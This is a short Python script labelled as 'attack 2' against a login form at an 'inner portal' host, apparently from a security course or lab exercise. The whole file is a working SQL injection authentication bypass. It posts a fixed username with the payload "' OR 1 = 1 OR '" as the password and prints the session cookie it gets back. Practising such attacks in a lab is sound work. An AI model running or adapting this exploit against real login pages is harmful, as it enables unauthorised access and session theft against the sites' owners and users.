# The Python script for attack 2 (Inner Portal login form)

import requests


# Define the URL
url = 'https://inner.portal.regjeringen.uiaikt.no/login'

# Define the form data
data = {
    'username': 'jonas.dahl',
    'password': "' OR 1 = 1 OR '"
}

# Send the POST request
response = requests.post(url, data=data, allow_redirects=False)

# Check the status code
if 400 > response.status_code:
    if 'session' in response.cookies:
        print("Login success")
        print("Authorization cookie: session=" + response.cookies["session"])
    else:
        print("Response did not contain a cookie")
else:
    print(f'Request failed with status code {response.status_code}')
